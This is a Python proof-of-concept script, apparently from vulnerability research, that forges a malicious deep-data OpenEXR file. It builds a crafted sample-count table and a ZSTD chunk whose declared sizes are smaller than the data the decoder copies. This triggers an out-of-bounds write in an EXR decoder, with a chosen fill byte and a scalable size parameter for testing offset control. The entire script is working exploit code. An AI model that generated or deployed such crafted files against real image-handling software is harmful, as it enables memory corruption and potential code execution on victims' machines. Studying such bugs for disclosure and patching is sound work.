#!/usr/bin/env python3
"""W178/W180: forge a deep mixed-channel ZSTD chunk with split==unpacked_size.

The sample table declares N samples (shared by FLOAT "A" and HALF "Z"),
giving a grid total of N*4 + N*2 = 6N bytes. The chunk leader and inner ZSTD
frame declare 2N bytes (N=32 is the original W178 64-byte case). The pinned
vulnerable sink copies the 4N-byte FLOAT block from an in-bounds source to
destination offset 0 and the 2N-byte HALF block, which is file-chosen, to
destination offset 4N. W180 scales N to 32/64/128 to test offset control.
"""
import os
import struct
import subprocess
import sys
import tempfile

BASE = sys.argv[1] if len(sys.argv) > 1 else "work-mixed/baseline_deep_mixed.exr"
OUT = sys.argv[2] if len(sys.argv) > 2 else "work-mixed/poc_mixed.exr"
N = int(sys.argv[3]) if len(sys.argv) > 3 else 32
BYTE = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0x3C

data = open(BASE, "rb").read()
p = 8
while True:
    if data[p] == 0:
        p += 1
        break
    p = data.index(b"\x00", p) + 1
    p = data.index(b"\x00", p) + 1
    (sz,) = struct.unpack_from("<i", data, p)
    p += 4 + sz
off0, = struct.unpack_from("<Q", data, p)
assert off0 == p + 8

q = off0
(y,) = struct.unpack_from("<i", data, q)
st_sz, pk_sz, un_sz = struct.unpack_from("<qqq", data, q + 4)
print(f"baseline y={y} samptab={st_sz} packed={pk_sz} unpacked={un_sz}")

# Deep sample count table: cumulative counts, 1 per pixel except the last.
counts = [1] * 63 + [N]
cum, tbl = 0, bytearray()
for c in counts:
    cum = max(cum, c)
    tbl += struct.pack("<I", cum)
assert len(tbl) == 64 * 4

# Inner ZSTD payload: one 2N-byte segment of 2-byte elements, all BYTE.
inner = struct.pack("<Q", 2 * N) + bytes([BYTE]) * (2 * N)
with tempfile.NamedTemporaryFile(delete=False) as tf:
    tf.write(inner)
    tmp = tf.name
payload = subprocess.run(["zstd", "-q", "-c", "-19", tmp],
                         capture_output=True, check=True).stdout
os.unlink(tmp)
MAGIC = 8248453963162350458
frame = (struct.pack("<Q", MAGIC) + struct.pack("<I", 1)
         + struct.pack("<I", 0) + struct.pack("<Q", len(payload)) + payload)

chunk = (struct.pack("<i", y) + struct.pack("<qqq", len(tbl), len(frame), 2 * N)
         + tbl + frame)
open(OUT, "wb").write(data[:off0] + chunk)
print(f"poc: N={N} byte=0x{BYTE:02x} grid={N*4}+{N*2} split={2*N} "
      f"unpacked={2*N} frame={len(frame)} wrote={len(data[:off0]+chunk)}")
